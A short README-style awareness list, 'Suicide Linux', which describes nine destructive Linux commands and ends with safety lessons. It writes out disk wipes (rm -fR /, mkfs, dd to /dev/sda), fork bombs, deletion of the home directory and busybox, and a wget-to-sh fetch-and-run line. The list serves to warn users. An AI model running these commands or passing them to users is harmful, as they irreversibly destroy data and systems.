:bomb: Suicide Linux
=====================

*Simple list of deadly linux commands. All the Linux that nobody will teach you, but that you will experience in first person. At least one time in your life.*

Some of these commands need administration rights (e.g. sudo ...) to be executed, some Linux distributions enforce specific protection mechanisms. So it is not so simple to destroy your Linux machine, but pay attention in any case. 

## :warning: Warning!! :warning:
> Most of the commands in this tutorial are **really dangerous**!!!
DO NOT use these commands on a real system if you have no idea of what you are going to do.


#### :one: Wipeout!

`rm -fR /`

With this command you asking to delete every files in your disk. Your only hope is that some security control will denied you to do something so silly.


#### :two: Fork Bomb

`:(){ :|: & };:`

Elegant and deadly as a dark-lady. This short shell script replicates itself until all the processing capabilities of your computer will be occupied. Shutdown and restart seems to be the only solution.

More simple, but same effects:

`perl -e 'fork while true;'`


#### :three: Tabula rasa

`mkfs.ext4 /dev/sda1`

Do you remember `FORMAT C:` of the old DOS? this have the same result.

#### :four: Right Time, but Wrong Place

`date > /dev/sda`

Redirecting will write raw bytes on your disk partition. What can never will be? nothing good! surely.


#### :five: Collecting Junk is a Dirty Job

`dd if=/dev/random of=/dev/sda`


#### :six: Have to start again

`mv ~ /dev/null`

This command will move all your personal data in the Linux equivalent of a Black Hole.


#### :seven: Danger from the Outside

`wget http://example.com/something -O – | sh –`


#### :eight: No More Busy

`find / -name busybox -exec rm -f {} \;`

#### :nine: Kernel, Don't Panic

`cat /dev/port`

The simplest way to freeze your system.


## :pencil: Lessons Learned
* execute commands with root privileges only if it is strictly necessary
* beware from `rm -r` commands
* never handle partions handles (such as `/dev/sda1`)
* never execute untrusted content
* there should be a good reason if your administrator password is requested 


## References
* [How to Geek](http://www.howtogeek.com/125157/8-deadly-commands-you-should-never-run-on-linux/)
